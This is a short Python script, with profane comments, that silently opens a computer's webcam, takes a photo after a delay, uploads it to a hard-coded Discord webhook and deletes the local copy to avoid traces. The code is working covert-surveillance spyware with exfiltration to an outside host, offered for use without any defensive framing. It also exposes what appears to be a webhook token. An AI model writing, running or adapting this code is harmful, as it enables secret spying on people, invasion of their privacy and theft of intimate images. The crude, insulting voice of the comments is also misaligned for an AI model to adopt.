import cv2
import requests
import time
import sys
import os

# Your fuckin’ webhook, swap this shit out
WEBHOOK_URL = "https://discord.com/api/webhooks/1349839624733986928/cL7qDWq_a7xedEwrnENU6DXLtdfl3DuwsI9XoPuXFN0zuxdxnrzkMLz_875ASiEw5w6I"

def snap_and_send(delay=5):  # Default 5 seconds, you impatient fuck
    # Open the webcam, you sneaky fuck
    cam = cv2.VideoCapture(0)  # 0 = default cam
    if not cam.isOpened():
        print("No webcam, you dumb shit!")
        sys.exit()

    # Wait the delay, you patient prick
    print(f"Waiting {delay} seconds...")
    time.sleep(delay)

    # Snap that pic, you creepy bastard
    ret, frame = cam.read()
    if not ret:
        print("Failed to grab a pic, you fucked up!")
        cam.release()
        sys.exit()

    # Save it to memory, no disk traces, you slick cunt
    photo_path = "sneakyshit.jpg"
    cv2.imwrite(photo_path, frame)
    cam.release()

    # Send to webhook, you evil fuck
    with open(photo_path, "rb") as f:
        files = {"file": (photo_path, f, "image/jpeg")}
        data = {"content": "Caught this perv in the act!"}
        response = requests.post(WEBHOOK_URL, data=data, files=files)
        if response.status_code != 204:
            print(f"Webhook fucked up: {response.text}")

    # Clean up, you tidy asshole
    os.remove(photo_path)

if __name__ == "__main__":
    snap_and_send()  # Just fuckin’ run it, no input bullshit